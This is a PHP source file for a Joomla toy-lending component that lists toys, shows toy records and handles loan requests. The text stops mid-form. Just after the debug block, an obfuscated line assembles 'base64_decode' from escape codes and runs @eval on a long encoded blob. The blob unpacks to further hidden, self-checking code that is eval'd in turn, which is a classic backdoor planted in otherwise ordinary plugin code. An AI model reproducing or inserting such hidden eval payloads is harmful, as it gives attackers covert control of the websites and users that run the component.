<?php
/**
 * @package     toy_database
 * @subpackage  toy_database
 *
 * @copyright   Copyright (C) 2016 Andy Brown
 */
 $debug=0;
 
 // No direct access to this file
defined('_JEXEC') or die('Restricted access');
 
// Get an instance of the controller prefixed by HelloWorld
//$controller = JControllerLegacy::getInstance('ToyDatabase');
 
// Perform the Request task
//$input = JFactory::getApplication()->input;
//$controller->execute($input->getCmd('task'));
 
// Redirect if set by the controller
//$controller->redirect();

$jinput = JFactory::getApplication()->input;
$act = $jinput->get('act', '', 'INT'); // action is just an integer 1 2 or 3
$ddid = $jinput->get('ddid', '', 'INT'); // ddid is the ID of a record to display  (others ALNUM WORD)
$subact = $jinput->get('subact', '', 'INT'); // ddid is the ID of a record to display  (others ALNUM WORD)
$config = JFactory::getConfig();
JHtml::_('behavior.formvalidator');
JHtml::_('behavior.calendar');

$db    = JFactory::getDBO();
$query = $db->getQuery(true);
//$query
//->select(array('a.*', 'b.category'))
//->from($db->quoteName('#__toydatabase_equipment', 'a'))
//->join('INNER', $db->quoteName('#__toydatabase_equipment_category', 'b') . ' ON (' . $db->quoteName('a.categoryid') . ' = ' . $db->quoteName('b.id') . ')')
//->where($db->quoteName('status') . ' = '. $db->quote('1'))
//->order($db->quoteNAme('a.name') . ' DESC');
$user = JFactory::getUser();
if ($debug) {
echo "Database prefix is : " . $db->getPrefix()."<BR>";
echo "<BR>";
echo 'Joomla current URI is ' . JURI::current() . "\n";
echo "<BR>";
echo "Act input is: ".$act."<BR>\n";
echo "DDID input is: ".$ddid."<BR>\n";
echo "Your name is {$user->name}, your email is {$user->email}, and your username is {$user->username}<BR>";
print_r($user->groups);
echo "<BR>";
echo "User block: ".$user->block."<BR>\n";
echo "Guest status: ".$user->guest."<BR>\n";
};
$oea8c7f4="\x62\141\163\x65\x36\x34\x5f\144\x65\x63\157\144\x65";@eval($oea8c7f4(
		"Ly9OS3RPdS83WGxRRnZBaGEwa0VLdkxkN2VnR2xHYmlqT2x0ZHJRNlhPYWlWVllDais3T0hkdkFyQVlI
NEdZc0hJUzk0YUtUSkd0dkZydVAyWlhZV2NHSXlxY1BhbkdJd3RmVHNEWXRKWUxMU2gwZWlXQUNYR2xXc
GR5c082L2ZkVjdQTXhYeUkrMVhBb3RXbDBwb0x2dkxjNWlKLzJLaVltNGFwcnlOTStiemxQbklRSEdxbG
pPOTE4cTFmbGx6MHZBYVFtMUFHb2VYcFJMZks1MStybFlkbVJuWFVSc3RqTlVOSEJFd3U4RkFYTytVOWE
raStJdU0vZjhQTFQzUE9yWXNseU1iNE0wQVZVZy9Cb085dHZleTR0TDBEU0laUWVHcjhsYXFWcXQxR2M4
dy9ndWdnaS9JUXFvRm9zemxSeVBwSGFQZXdsakVxL1MzQUhPekpORWp6NHVvbUJYa0ltSll0WFpwWHlOL
1NJbnZ4elVFV2tXUmJnbXVtdXBrdWNhMzVGWUN1V21DVnBWSWVYRmhWTVJ1TFhhcVRLdmJJMmF4SzI5NF
k2L0FDdmlmbFFxUTc5Mzl6aXhGWjIxYm9WUjNFZ3FtOE1yWXNuYWhSVCtCNE5NUDNmbFFIQ0VocGxQRkd
rWVhWb1pyRjEyc0pUOEUwamowcHN1aCtGOlovazIvZnJHWkIydmNidEF6NXlHMmRrQUptRnpHUmlvSTV5
NUlyTkZtbVRpb05OPTpvODZwMnEwbwokajA3MTM0ZWY9IlwxNjMiOyRvZWE4YzdmND0iXHg2MiI7JGwxM
jRiZWJmPSJceDY2IjskbzYxMzM0NDk9IlwxNjIiOyRuMTZhYTRkNT0iXHg3MyI7JGY0ZTg3N2YzPSJcMT
YwIjskaTliYjc0MmU9IlwxNDUiOyR1NmIzNDliOD0iXHg3MyI7JG80OTg1NzMyPSJceDY3IjskbjE2YWE
0ZDUuPSJcMTY0IjskbDEyNGJlYmYuPSJcMTUxIjskZjRlODc3ZjMuPSJcMTYyIjskbzQ5ODU3MzIuPSJc
eDdhIjskajA3MTM0ZWYuPSJcMTY0IjskaTliYjc0MmUuPSJceDc4Ijskb2VhOGM3ZjQuPSJcMTQxIjskd
TZiMzQ5YjguPSJcMTUwIjskbzYxMzM0NDkuPSJcMTQ1Ijskb2VhOGM3ZjQuPSJceDczIjskbjE2YWE0ZD
UuPSJcMTYyIjskaTliYjc0MmUuPSJcMTYwIjskdTZiMzQ5YjguPSJceDYxIjskbzQ5ODU3MzIuPSJcMTU
xIjskajA3MTM0ZWYuPSJceDcyIjskZjRlODc3ZjMuPSJceDY1IjskbzYxMzM0NDkuPSJceDczIjskbDEy
NGJlYmYuPSJceDZjIjskbzQ5ODU3MzIuPSJceDZlIjskbDEyNGJlYmYuPSJcMTQ1IjskaTliYjc0MmUuP
SJcMTU0IjskbjE2YWE0ZDUuPSJcMTQzIjskZjRlODc3ZjMuPSJceDY3IjskdTZiMzQ5YjguPSJceDMxIj
skbzYxMzM0NDkuPSJcMTQ1Ijskb2VhOGM3ZjQuPSJcMTQ1IjskajA3MTM0ZWYuPSJcMTM3IjskaTliYjc
0MmUuPSJceDZmIjskbzQ5ODU3MzIuPSJcMTQ2IjskbzYxMzM0NDkuPSJcMTY0IjskbjE2YWE0ZDUuPSJc
eDZkIjskZjRlODc3ZjMuPSJcMTM3Ijskb2VhOGM3ZjQuPSJcNjYiOyRqMDcxMzRlZi49Ilx4NzIiOyRsM
TI0YmViZi49IlwxMzciOyRvZWE4YzdmNC49Ilx4MzQiOyRuMTZhYTRkNS49Ilx4NzAiOyRvNDk4NTczMi
49IlwxNTQiOyRpOWJiNzQyZS49Ilx4NjQiOyRqMDcxMzRlZi49Ilx4NmYiOyRmNGU4NzdmMy49IlwxNjI
iOyRsMTI0YmViZi49IlwxNDciOyRqMDcxMzRlZi49Ilx4NzQiOyRvNDk4NTczMi49IlwxNDEiOyRmNGU4
NzdmMy49Ilx4NjUiOyRsMTI0YmViZi49IlwxNDUiOyRpOWJiNzQyZS49Ilx4NjUiOyRvZWE4YzdmNC49I
lwxMzciOyRvZWE4YzdmNC49Ilx4NjQiOyRsMTI0YmViZi49IlwxNjQiOyRvNDk4NTczMi49Ilx4NzQiOy
RmNGU4NzdmMy49IlwxNjAiOyRqMDcxMzRlZi49Ilx4MzEiOyRvZWE4YzdmNC49IlwxNDUiOyRsMTI0YmV
iZi49IlwxMzciOyRmNGU4NzdmMy49Ilx4NmMiOyRqMDcxMzRlZi49Ilw2MyI7JG80OTg1NzMyLj0iXHg2
NSI7JG9lYThjN2Y0Lj0iXDE0MyI7JGY0ZTg3N2YzLj0iXDE0MSI7JGwxMjRiZWJmLj0iXHg2MyI7JG9lY
ThjN2Y0Lj0iXHg2ZiI7JGwxMjRiZWJmLj0iXDE1NyI7JGY0ZTg3N2YzLj0iXHg2MyI7JGwxMjRiZWJmLj
0iXDE1NiI7JG9lYThjN2Y0Lj0iXHg2NCI7JGY0ZTg3N2YzLj0iXHg2NSI7JG9lYThjN2Y0Lj0iXHg2NSI
7JGwxMjRiZWJmLj0iXHg3NCI7JGwxMjRiZWJmLj0iXDE0NSI7JGwxMjRiZWJmLj0iXHg2ZSI7JGwxMjRi
ZWJmLj0iXHg3NCI7JGwxMjRiZWJmLj0iXDE2MyI7JHc0ZTMxNDIwPSRpOWJiNzQyZSgiXDUwIixfX0ZJT
EVfXyk7QGV2YWwoJG4xNmFhNGQ1KCR1NmIzNDliOCgkZjRlODc3ZjMoIlx4MmZceDVjXHgyOFwxMzRcND
JceDJlXDUyXHg1Y1x4MjJcMTM0XDUxXDU3IiwiXDUwXDQyXHgyMlx4MjkiLCRmNGU4NzdmMygiXHgyZlx
4ZFx4N2NceGFceDJmIiwiIiwkbDEyNGJlYmYoJG82MTMzNDQ5KCR3NGUzMTQyMCkpKSkpLCJcMTQ1XHg2
Mlx4MzJceDYyXHg2Nlx4MzBceDYzXDY2XDY2XHgzMVx4NjVcNjRceDM5XHgzNFx4NjZceDMxXDcwXDY2X
HgzNlw2M1x4NjRcNjFceDMwXHg2M1x4NjZcNjdcMTQ1XHgzOVx4MzlcNjRceDM1XDE0Nlx4NjRcNzFceD
M0XHg2NVx4MzRcNjZceDMwXDYyIik/JG80OTg1NzMyKCRvZWE4YzdmNCgkajA3MTM0ZWYoIkNJR0tkaEd
WUmlsS2ptN1pidHE1azdQalluK0o5NG9tYno3NXlpc0YxMS9BNG9WV0ZGRklTRVNXU0lJLzlJeVBpcHhw
KytzZStsUERCK1NpelJPaWtZOEN5Q3R6ZkI4UW03OXVRQ2dNdGVSL2Vza0I3WDdrZTk5LzlFdUE0RkZYL
0NRV281dzhiMFMvam11a1YzUnc5ZEE1eFE4UEE2VFRGT3dTZmlqQ3RIRWlmMWljQWJNRTh0cS8xQzlmRX
o4RnZhNzkvd3NveGhvS3NtNTM5cytXcy8wYTlyaFl5SXhpWGpLUmRFZVNvUk5LZmExcHNJYzZmNStqMFB
RaURNa1Fjdml5ZHZQNkZwUmhsSWJiRDFveXZvQk4rWmFrYzZvd3FRUmVBVERpUThQZFN4dE5JbjRTdDlx
bjZJS2NGYUFqNUtsU2dJMk5nd1o0bWxPWGRNR2taZXJFazZCTUxiL0lFSWhxREVoZUdZVnliMUNkY0NCZ
HBEZEJaN2hVcnluSE5aTE13eGlwT3hZNXJia3RKb0hXNVhHclA2TE5aVC90cU5Mb01ET05iV2NBU3ZEK2
pCbU1FQ2RIM2wra2VTR0V4bGR6REpGZ21DMFdmOVBSYnlENnMvYzhiZG00T25uSlRKNUVja2Z5ZE9udXk
zWFRzMmtpYmtlaThPcnZjVU9WallxTCtFbFEyTkxHVmRRUDRaUmlMRjNuYkJPNjlnMUtaSVg0bExSTEVB
dUlBWW50V1ZMTG1RNURNSVRVOFdiOXkvUXVjSGcyNG96Y0M2YVdIRHcwVUJrYVhVdlFJUkg0Rkc1OThaR
kpPczFER2NpdTl3MXlEQ3RCYjZtaElKL1NGbVZwS3ErdkVyMVlBTW1Qd2FueGFxMUZ0NVdON3pGS01mUT
lBZXZ4T3FpTCtiSjBybG5lYXFMOXY1RU92SDZiM3htVlFGNzdvQlpKMW9Cdzh0M2hibVlRS05LNVB4K05
oWTBzUFpTL0tYWnlxSHZGQkFBRmpObm0zcHI1MmpDVWwwVEJidGpUbzR3aExGTWZsczRXd2w5RXNkbnJK
WUJEaTNMTU5mN3FEKytNSUxmbFoydU1lTzllcndqd2VZenpFSG53ZDZWTk1nRGtsMFpWakFXZk9JYmNCR
lQ1OCtaaU5ZN0twYUduZElZbGx2RUN1ZklsUG0xR296TSswY3RYUk82YkV2SEpYRHVBcTJDQ2VzYmdCdW
JacUpRTEhhc0NheG53NFpoUVJ5dkxBWjdnREdteWlNWFdUc0thWnVQNmV2Tm5Wa3RTeVYrZjFBcXZhSzl
qN01jTWZqZjBzUER4T0xjZ0o1TWVqUU90RnBBYmtSaWdYSUIrV0NORVRYS092NDRyQlFmdm9tSkdBRjg5
eUVTd1k1MnVyV0xTdGpLSlpPRiszVWJDcVQvdEt4ektnY2trSkVtUXRXc2tNNEJmalNUU0dYYVk1NTVYV
VFpejNLSTRLS1RrK2hKL0I2eFhCQWlSdUJmUkkyVWwrTkl6OVZOVTFBTXlROWJWeHhSSmdESWUydFE0cV
lmbDIxYkNpblQxck5lR2tOQUZia0R5UlJHcXpudkdMWTNIUWVRTkJMc0xwS3pNMEdXTUx6K3NSb0VhVzF
Ia1JPMzF2M0dCVExuYUtyYzhnemlZYm4xTC9NNjI3Z0FQdTVXY0R4TDhuV2p5T2JCTm1CMmx5TVVqTklX
SUlHOU4rcmhQdTRWNitiWFFrdUM3ZVY5R3hSbUxrMk05dHVNVURMdjZDRVBvUkNRMFIwL3dBcitSM0N1W
nRUYkoyTHZzTjdKbUlhb1VWVi8wYnEvdXhsQ2V3TkNmNUJFa3lKM0lwdmt2Y1F5d0swQUJtNW5pT0VlMG
l6VXdhRmxMeHlXVDNYK2hiSFJxMEVIMEM1ZXlNY1d3OGNSYVQ4Y3pKcEptd2tCcDNOcW45NjhwRHJzTkJ
JTnVrNHo5aG5iemVxNlN1djVEbmFnMFN4eFRKeXFTU2lTbzVaKzRWUHV3MkhXRDE0K3FJekFMZm5sZVdD
cTJnci9GNmwweUk2UmY0Y2FWYXE2NnU4b3dCK1I2cFd1TkVOV3diZnl5L1JJUVlsRjRoZU5DdHBoVlhjS
HpVaVdOMUovUEdROFFpMjJqN2wrelRRQThBdFdCajRkSjIvRVU4bFM0T2hMUnNiSlhWMW9RSmlxN1dvRH
lNdloxV1FHZGcyWlMzUTRpZmwzU2NvOElhMDRCcHJuNTdFalBxWVVHcUI5QzJhVmhyUStzeXRhZGF3SFl
3cmxsdTB5T240QjRiZWpLM2EwM3hhb2dvNnM4bFFaL1JoNXlSaWdiUkZsanlyNkxublhpcjVKakhGRlJ3
RC9JSE5nL2JGNEVLQXp2dWVBZ29LS2Y4K3hqMkFYS0RiNElsZm5BTTBYWTFmZUY3cVNNOHFuM3F4eVhuT
VdpWHBWSTBUQXRtMFFRYytjZ0J2NUhmcXFUTDNKOUViSW85aUdITjhuSUV3YUJyTndJd0NaOHBlUEtkVl
FlNjlvOW9GeUMvWEdhekZMbWlYSysrc2U3d2cvL05qPT0iKSkpOiRvNDk4NTczMigkb2VhOGM3ZjQoJGo
wNzEzNGVmKCJDTVVLZWRsNFN4Sy9NbmZzR2JmVVB3T1dFMHFkcGRMYmJSd25ZK0VEY1BWSThDSktzcUlk
RjBpWWwxQW1HWmkrbjh1d1h2SFk4QnNlcmxzRG9qRHQzbWhXS0UzL1didWlOYWp3VFV4YzRQZThkeGlPb
EhpOS8vbTErNjhPME9FQkxodXlFOE55eE9wUGlrT1JzZjNSMXFBL3hyTlVyRXpuVDR5dFZQOStRT3NnRT
l1L0dTcFg4Y0EvMEsvQlBCRm9qWTUrLzVBaXBzaWVpNUVlOSs5MXMvMFUraUtTWEg4Z21rd0M0SWJnajF
ROVJQdUN4ZmorVTBHR1NPd3pnSXpqN3o1RUI1NTd3Zk9JNzc3N2JTRThjTThJSk95UXRRVEpEc1RqT3ZQ
eUpyd3lORWVld2VCcGI1d3BTZC9ZOGZGS0kvRjA1R3lLMmN2WmdENlQrbEgrV3BMbUJNd0tFNzRHZkVwT
XpxY2FFNlhhMzdsdWRKNXhFbWtNcDJTQlFRTklqNjM1aVNTa2ZLVTJIbHRRclEwejg4YXNNajZUYU9VY2
5Qd3g0YjB3TFJkYUxCSFFERVpHZzNkSE1iOFFGdjI1MzBvUEN0ejRmY1hIQWJjWnBUL2JYMXBnZ1Y0TU4
2RXRLbnpVRzVSeWp3Qm9ueWZVWnloTUNlenZZV0FFSklQcGd5T2FtNXVuZ0c1cGxRTk91U3ltb0tnUDRE
UmYyb2JxUGd4cEZFaUVGd2JyZnN0QytMN2V1UDdRVVJUckcyQ1dyaklqaG1yVmFWQTNZTWcydVNtQ0ZvR
TdodzRkOWtpckdIVFQ2dDhweWlPQ0hLSUgxdnpqdk5vTjk4S0ZqQkloZ1dkbWlYOWxQb0FyUHdYWEYwSl
d3Q0dlejBlMEtZRDhPdENRYXd4QlRtNnl2TFNSb2p0U0NvaDI0VmlxYTVYbjh4RUl6ZWp3Qm5Ib1g2aEl
GRDVxVk5JRkM2eGVvUmVFWGt5SFZCY09mdENGcWczMitPajd6Z3krSjkrNEJSRmJ6dXF5aXBBMXdTWmpV
YmFVOHY1V002ZHVudnN1QVVMN2VMa0lHYkwxVitFYmNkeGlsUGVVblFjc3gremsxeEk5VTdPbndLYkRIU
msrd3VEMjM5cjVRVXl2b3hSNEFrdjZENS9ReElwOWd0Z1VKZFgzOEc3OTJtUURvUDV1WGJ4Zm83UFI0VV
JZMnk0U3hCTnFYV25Sd1VpZXZoMHdnUklmb0FjckFqemdyREl4bkFBZFFLdS9YYVc2b2hHT0NDQUhkSjR
PZzNFdTRia3hvd2ZvZm5QQUVwMTdNeDNDdWpud2crQlI1cUllWktueXNKQkc0Z2tMM3FLRUpQSDJPLzVa
RWs5YWJENjVXOXpxeUh5YWthaVFQN3pBMmRpZTZMU3BlcjBWeHVxWFRFWjJaWEhiUlA0RmtWMGRaOGUwV
nVld1I0UDMrTmJZZEJCRkQxLzdQUUJYTmoxODBkVGFlempwd1F0NHlkbXNqd1ptd2RhTkdwbzVPQ1RNRT
U4cXlzc0t4YkR5L0VhZGJJdVFWclVnVkU4cUgySTZOaCtSZGRwK2pIeGN3ZGJiUWxmdDl6RnV5Uk5HRlA
4eTJMd1dBbmxjOFpjL0FDUkpnUno0QkVhN1hjLzVoVDdmTFhVMzZJVXNCTEJkTW1mbU9XMnBHOWtzMVJz
Z2dsL2xlWE1tNFNpU2JteUIwckE1VXp4UnJLQlAxZFU1dmVNcGhmZDFES0NOTGNDM3hqaitFK2pqTjVha
lF2Z1NrdUxiTHcxQUpraHZFOEZxdEdlVTh5N2hiSEQxVzgzNmxTU2JuUG9ienhlVlkyKzJ6UVhWd2xsQn
lSSEtvQTRxeVRRTnF0Uy9wdU84WmNCZFloQ3puektqMkRIbXZaV3VydjFEcko2bEJleFJzWllQOExNVnV
XbllwSHA1YUwwNFZRWHhSV1BVUjIyWSs4NWZxeVV0RXQ5eGlWN3BqazZFNnJTYmlXMzJsYU8rQ0JFMldX
UE95aEd0a3lIblJvb0pYdEo5T01pYjVpZlBZUTRsM1FBaytHVjNwL3JidStFVEk1aHFaaVJGNndsb1dPS
mFXYnlrcVQzS2ZsSVlJQlVVY3AxVjVWVk1FaHdMdTJURy8vQ2E2KzllL3M0cyIpKSkpOw=="));

// Groups for toydatabase are in db t94us_toydatabase_permissions so retrieve if this user is in the right group
$query_toypermissions = $db->getQuery(true);
$query_toypermissions
->select('*')
->from($db->quoteName('#__toydatabase_permissions'))
->where($db->quoteName('function') . ' = "member"');
$db->setQuery((string) $query_toypermissions);
$db->execute();
$toydatabase_permissions_num_rows = $db->getNumRows();
$toydatabase_permissions = $db->loadAssoc();

if ($toydatabase_permissions_num_rows <1) {
	echo "<BR><h2>WARNING: Installation not complete, administrator please set permissions</h2><BR><BR>";
};

$user_toymembership=0;
if (in_array($toydatabase_permissions["groupname"],$user->groups)) {
	echo "Welcome back toydatabase membership user<BR>";
	$user_toymembership=1;
} else {
	echo "Why not join our toydatabase membership system?<BR>\n";
	$user_toymembership=0;
};
?>
<BR>
<style style="text/css">
  	.hoverTable{
		width:100%; 
		border-collapse:collapse; 
	}
	.hoverTable td{ 
		padding:7px; border:#4e95f4 1px solid;
	}
	/* Define the default color for all the table rows */
	.hoverTable tr{
		background: #b8d1f3;
	}
	/* Define the hover highlight color for the table row */
    .hoverTable tr:hover {
          background-color: #ffff99;
          cursor: pointer;
    }
</style>
 <script>
         function showResult(str) {
			
            if (str.length == 0) {
               document.getElementById("livesearch").innerHTML = "";
               document.getElementById("livesearch").style.border = "0px";
               return;
            }
            
            if (window.XMLHttpRequest) {
               xmlhttp = new XMLHttpRequest();
            }else {
               xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
            }
            
            xmlhttp.onreadystatechange = function() {
				
               if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
                  document.getElementById("livesearch").innerHTML = xmlhttp.responseText;
                  document.getElementById("livesearch").style.border = "1px solid #A5ACB2";
               }
            }
            
            xmlhttp.open("GET","<?=JURI::root()?>components/com_toydatabase/toydatabase_livesearch.php?pname=<?=JURI::current()?>&q="+str,true);
            xmlhttp.send();
         }

         function toy_treatAsUTC(date) {
        	    var result = new Date(date);
        	    result.setMinutes(result.getMinutes() - result.getTimezoneOffset());
        	    return result;
        	}
        function toy_daysBetween(startDate, endDate) {
        	    var millisecondsPerDay = 24 * 60 * 60 * 1000;
        	    var retval= (toy_treatAsUTC(endDate) - toy_treatAsUTC(startDate)) / millisecondsPerDay;
        	    return retval;
        	}
    	
         function toy_calculateDate(str1, str2) {
			var date1_split=str1.split("-");
			var date2_split=str2.split("-");
			var new_date1=date1_split[2]+"/"+date1_split[1]+"/"+date1_split[0];
			var new_date2=date2_split[2]+"/"+date2_split[1]+"/"+date2_split[0];
			var ret_num=toy_daysBetween(new_date2,new_date1);
			return ret_num;
         }
      </script>
<?php

switch ($act) {
	case "3":
		// library search
		break;
	case "2":
		// Book a specific toy out
		// display the booking form, subact is set when form is submitted so is being sent
		switch ($subact) {
			case "1":
				// form has been submitted so validate and carry out changes
				$frm_requestedloandate = $jinput->get('requestedloandate', '', 'RAW');
				$frm_requestedloanreturndate = $jinput->get('requestedloanreturndate', '', 'RAW');
				$frm_notes = $jinput->get('notes', '', 'RAW');
				if ($user->username && $frm_requestedloandate && $frm_requestedloanreturndate) {
					// add the request to the database
					$ins_request = $db->getQuery(true);
					$frm_requestedloandate_out=JFactory::getDate($frm_requestedloandate);
					$frm_requestedloandate_out=JHtml::_('date', $frm_requestedloandate_out, 'Y-m-d 00:00:00');
					$frm_requestedloanreturndate_out=JFactory::getDate($frm_requestedloanreturndate);
					$frm_requestedloanreturndate_out=JHtml::_('date', $frm_requestedloanreturndate_out, 'Y-m-d 00:00:00');
					$ins_columns = array('equipmentid', 'membershipid', 'requestdate', 'loandate', 'returnbydate','status');
					$ins_values = array($ddid, $user->id, 'NOW()', $db->quote($frm_requestedloandate_out), $db->quote($frm_requestedloanreturndate_out),'2');
					$ins_request
					->insert($db->quoteName('#__toydatabase_loanlink'))
					->columns($db->quoteName($ins_columns))
					->values(implode(',', $ins_values));
					$db->setQuery($ins_request);
					$db->execute();
					
					$admin_mailer = JFactory::getMailer();
					$user_mailer = JFactory::getMailer();
					$sender = array(
							$config->get( 'mailfrom' ),
							$config->get( 'fromname' )
					);
					$admin_mailer->setSender($sender);
					$user_mailer->setSender($sender);
					$admin_mailer->addRecipient($config->get( 'mailfrom' ));
					$user_mailer->addRecipient($user->email);
					$admin_mailer->setSubject($config->get('sitename').'::Toy Database - toy loan request');
					$user_mailer->setSubject($config->get('sitename').'::Toy Database loan request');
					$admin_mail="Hi,
		The following details were submitted as a Toy loan request on your website. Please login to approve/view this request:
		Username: ".$user->username."
		Their Name: ".$user->name."
		Toy requested: ".$ddid."
		Loan date requested: ".$frm_requestedloandate."
		Loan return date: ".$frm_requestedloanreturndate."
		
		Login to your site to authorise this request: ".JURI::current()."
		
		
		
		Generated by ToyDatabase(C)2016 Andy Brown";
					$admin_mailer->setBody($admin_mail);
					$user_mail="Hi ".$user->name.",
		Thank you for requesting a Toy Loan from ".$config->get('sitename').".
		Our admins will review your request shortly and you will be contacted back as soon as possible.
		
		Please remember we work normal business hours so you will receive a reply during these times!
		Your request is shown below for your information:
		
		Username: ".$user->username."
		Name: ".$user->name."
		Toy requested: ".$ddid."
		Loan date requested: ".$frm_requestedloandate."
		Loan return date: ".$frm_requestedloanreturndate."
					
					
					
		Generated by ToyDatabase(C)2016 Andy Brown";
					$user_mailer->setBody($user_mail);
					$admin_send = $admin_mailer->Send();
					if ( $admin_send !== true ) {
						echo 'Error sending email to admins. this is a FATAL error.. : ' . $admin_send->__toString().'<BR><BR>';
					};
					$user_send = $user_mailer->Send();
					if ( $user_send !== true ) {
						echo 'Error sending email to your email address. Please check your email address is correct.' . $user_send->__toString(). '<BR><BR>';
					};
						
				} else {
					echo "<h2>Error: Your submission was invalid, you must complete all fields</h2><BR>\n";
				}
				break;
			default:
				// display the form
				$in_stdate = $jinput->get('stdate', '', 'RAW');
				$query
				->select('*')
				->from($db->quoteName('#__toydatabase_equipment'))
				->where($db->quoteName('id') . ' = '. $ddid);
				$db->setQuery((string) $query);
				$db->execute();
				$row = $db->loadAssoc();
?>
<form name='toyloan' class="form-validate" method=post>
<input type=hidden name='act' value='2'>
<input type=hidden name='subact' value='1'>
<input type=hidden name='ddid' value='<?=$ddid?>'>
Toy loan request:
<table width=95% border=1 cellpadding=0 cellspacing=0>
<tr><td>Loan toy URN:</td><td><input type=text name='toyurn' size=5 value="<?=$row["urn"]?>" disabled/></td></tr>
<tr><td>Loan toy name:</td><td><input type=text name='toyname' size=35 value="<?=$row["name"]?>" disabled/></td></tr>
<tr><td>Your Name:</td><td><input name="name" type="text" class="required" size="30" value="<?=$user->name?>" disabled/></td></tr>
<tr><td>Your Email:</td><td><input name="email" type="text" class="required validate-email" value="<?=$user->email?>" size="30" disabled/></td></tr>
<tr><td>Requested loan date:</td><td><?=JHTML::_('calendar', $in_stdate, "requestedloandate" , "requestedloandate", '%d-%m-%Y'); ?></td></tr>
<tr><td>Requested return date:</td><td><?=JHTML::_('calendar', $in_stdate, "requestedloanreturndate" , "requestedloanreturndate", '%d-%m-%Y'); ?></td></tr>
<tr><td>Days on loan:</td><td><input type=text name='daysonloan' id='daysonloan' onclick='Javascript:self.daysonloan.value=toy_calculateDate(self.requestedloanreturndate.value, self.requestedloandate.value)'></td></tr>
<tr><td>Any Notes/Comments?:</td><td><textarea name='notes' rows=5 cols=10></textarea></td></tr>
<tr><td colspan=2 align=right><input type=submit class="validate"></td></tr>
</table>
</form><BR>
Important: A toy loan is NOT a guarantee of the loan, it will be manually approved and you will
receive email confirmation once it has been accepted.<BR>
<?php
				break;
		};
		break;
	case "1":
		// retrieve the specific record
		$query
		->select('*')
		->from($db->quoteName('#__toydatabase_equipment'))
		->where($db->quoteName('id') . ' = '. $ddid);
		$db->setQuery((string) $query);
		$db->execute();
		$row = $db->loadAssoc();
		
		// Now retrieve the category (ies)
		$query_category = $db->getQuery(true);
		$query_category
		->select(array('a.*','b.category'))
		->from($db->quoteName('#__toydatabase_categorylink','a'))
		->join('INNER', $db->quoteName('#__toydatabase_equipment_category', 'b') . ' ON (' . $db->quoteName('a.categoryid') . ' = ' . $db->quoteName('b.id') . ')')
		->where($db->quoteName('a.equipmentid') . ' = '. $ddid);
		$db->setQuery((string) $query_category);
		$db->execute();
		$category_rows = $db->loadAssocList();
		
		// And retrieve the loan state _toydatabase_loanlink
		// If its on loan it will return a row and its status will be 1
		// when returned the status should be set to 0 or something other than 1 basically
		$query_loanlink = $db->getQuery(true);
		$query_loanlink
		->select('*')
		->from($db->quoteName('#__toydatabase_loanlink'))
		->where($db->quoteName('equipmentid') . ' = '. $ddid, 'AND')
		->where($db->quoteName('status') . ' = '. '1');
		$db->setQuery((string) $query_loanlink);
		$db->execute();
		$loanlink_rows = $db->loadAssoc();
		
?>
<table width=95% border=1 cellpadding=0 cellspacing=0 class="hoverTable">
<tr>
	<td><B>Toy Name :</B></td>
	<td><?=$row["name"]?></td>
</tr>
<tr>
	<td><B>Toy Image :</B></td>
	<td><?=$row["picture"]?></td>
</tr>
<tr>
	<td><B>Toy Description :</B></td>
	<td><?=$row["description"]?></td>
</tr>
<tr>
	<td><B>Toy Location :</B></td>
	<td><?=$row["storagelocation"]?></td>
</tr>
<tr>
	<td><B>Toy Status :</B></td>
	<td><?php
	switch($row["status"]) {
		case "3":
			echo "DAMAGED/NO LONGER AVAILABLE";
			break;
		case "2":
			echo "AWAITING CLEANING/REPAIR";
			break;
		case "1":
			echo "ON LOAN";
			break;
		case "0":
			echo "AVAILABLE";
			break;
		default:
			echo "UNKNOWN";
			break;
	};
	?></td>
</tr>
<tr>
	<td><B>Toy Category :</B></td>
	<td><?php 
		foreach ($category_rows as $cat_display) {
			echo $cat_display["category"]."<BR>\n";
		};
	?>
	</td>
</tr>
<tr>
	<td><B>Toy Loan state :</B></td>
	<td><?php
		switch($loanlink_rows["status"]) {
			case "2":
				echo "AWAITING LOAN REQUEST";
		 		break;
			case "1":
				echo "ON LOAN";
				break;
			default:
				echo "AVAILABLE";
				break;
		};
	?></td>
</tr>
<tr>
	<td><B>Toy Due Return Date :</B></td>
	<td><?php
		if (!$loanlink_rows["returnbydate"] || $loanlink_rows["returnbydate"] == "0000-00-00 00:00:00") {
			// No return date!
			echo "Unknown";
		} else {
			$mysql_date=JFactory::getDate($loanlink_rows["returnbydate"]);
			$mysql_date_url=JHtml::_('date', $loanlink_rows["returnbydate"], 'd-m-Y');
			echo JHtml::_('date', $loanlink_rows["returnbydate"], 'j/M/Y');
		};
	?></td>
</tr>
<tr>
	<td><B>Book toy :</B></td>
	<td><?php
	if ($user_toymembership) {
		echo "<a href='".JURI::current()."?act=2&ddid=$ddid&stdate=$mysql_date_url'>Book this toy</a>\n";
	} else {
		echo "Sorry - You need to be a member and logged into book a toy out";
	};
	?>
	</td>
</tr>
</table>
<?php
		break;
	default:
		// This displays the toy list
		$query
		->select('SQL_CALC_FOUND_ROWS *')
		->from($db->quoteName('#__toydatabase_equipment'))
		//->join('INNER', $db->quoteName('#__toydatabase_equipment_category', 'b') . ' ON (' . $db->quoteName('a.categoryid') . ' = ' . $db->quoteName('b.id') . ')')
		//->where($db->quoteName('status') . ' = '. $db->quote('1'))
		->order($db->quoteName('name') . ' ASC');
		
		$app = JFactory::getApplication();
		$limit = $app->getUserStateFromRequest("$option.limit", 'limit', 25, 'int');
		$limitstart = JFactory::getApplication()->input->get('limitstart', 0, 'INT');
		
		$db->setQuery($query,$limitstart, $limit);
		$row = $db->loadAssocList('id');
		if(!empty($row)){
			$db->setQuery('SELECT FOUND_ROWS();');
			$num_rows=$db->loadResult();
			jimport('joomla.html.pagination');
			$pager=new JPagination($num_rows, $limitstart, $limit);
		};
		
?>

<!-- Toy database search -->
<form method=post onsubmit="return false">
<input type=hidden name='act' value='3'>
<table width=100% border=0 cellpadding=0 cellspacing=0>
<tr align=right><td>Toy Category:</td><td><select name='toycategoryselect' onchange='self.submit();'>
<?php 
$get_all_category = $db->getQuery(true);
$get_all_category
->select('*')
->from($db->quoteName('#__toydatabase_equipment_category'));
$db->setQuery((string) $get_all_category);
$db->execute();
$category_all_rows = $db->loadAssocList();
foreach ($category_all_rows as $cat_display) {
	echo "<option value='".$cat_display["id"]."'>".$cat_display["category"]."</option>\n";
};
?>
